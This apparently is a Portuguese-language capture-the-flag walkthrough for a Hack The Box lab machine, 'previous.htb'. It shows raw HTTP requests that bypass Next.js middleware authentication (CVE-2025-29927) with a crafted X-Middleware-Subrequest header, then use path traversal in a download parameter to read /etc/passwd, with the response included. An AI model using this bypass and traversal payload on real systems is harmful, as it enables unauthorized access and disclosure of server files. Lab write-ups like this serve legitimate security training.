Footprint:

nmap: 22,80

Suposição
/_next/data/
Next.js Middleware Bypass Vulnerability (CVE-2025-29927)


Request
```
GET /docs/examples HTTP/1.1
X-Middleware-Subrequest:middleware:middleware:middleware:middleware:middleware
Host: previous.htb
Accept-Language: pt-BR,pt;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36
Sec-Purpose: prefetch;prerender
Purpose: prefetch
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Cookie: next-auth.csrf-token=b431c2e0194c5b645cb7686576f761ce621fb11d61261843d10c14f0932b92f2%7C0644805de188bd3461f249332e37b43d31f3f7dbb6f23dbc6ea82c104c917c92; next-auth.callback-url=http%3A%2F%2Flocalhost%3A3000%2Fdocs
Connection: keep-alive
```
abra no burp

e intercepte o dowload

Request
```
GET /api/download?example=hello-world.ts HTTP/1.1
Host: previous.htb
Accept-Language: pt-BR,pt;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://previous.htb/docs/examples
Accept-Encoding: gzip, deflate, br
Cookie: next-auth.csrf-token=a745159ad2795a4ddbc7cc267a6f0bec61bf07c00c8ec8f9d92ab499a90dfb7b%7C85193591b8b0b73d84281239b72a3b81cfe632643bfcb9e0e1de22fc5268d90d; next-auth.callback-url=http%3A%2F%2Flocalhost%3A3000%2Fdocs%2Fexamples%3Fsection%3Dexamples
Connection: keep-alive
```

vou usar o parametro example parar tentar ler arquivos

Request
```
GET /api/download?example=../../../etc/passwd HTTP/1.1
Host: previous.htb
X-Middleware-Subrequest:middleware:middleware:middleware:middleware:middleware
Accept-Language: pt-BR,pt;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://previous.htb/docs/examples
Accept-Encoding: gzip, deflate, br
Cookie: next-auth.csrf-token=a745159ad2795a4ddbc7cc267a6f0bec61bf07c00c8ec8f9d92ab499a90dfb7b%7C85193591b8b0b73d84281239b72a3b81cfe632643bfcb9e0e1de22fc5268d90d; next-auth.callback-url=http%3A%2F%2Flocalhost%3A3000%2Fapi%2Fdownload%3Fexample%3Dhello-world.ts
Connection: keep-alive
```
Response
```
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Tue, 02 Sep 2025 19:51:06 GMT
Content-Type: application/zip
Content-Length: 787
Connection: keep-alive
Content-Disposition: attachment; filename=../../../etc/passwd
ETag: "41amqg1v4m26j"

root:x:0:0:root:/root:/bin/sh
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
node:x:1000:1000::/home/node:/bin/sh
nextjs:x:1001:65533::/home/nextjs:/sbin/nologin
```


ou seja consegui ler aquivos 

https://next-auth.js.org/providers/credentials
https://github.com/vercel/next.js/blob/canary/examples/with-docker-multi-env/docker/production/compose.yaml

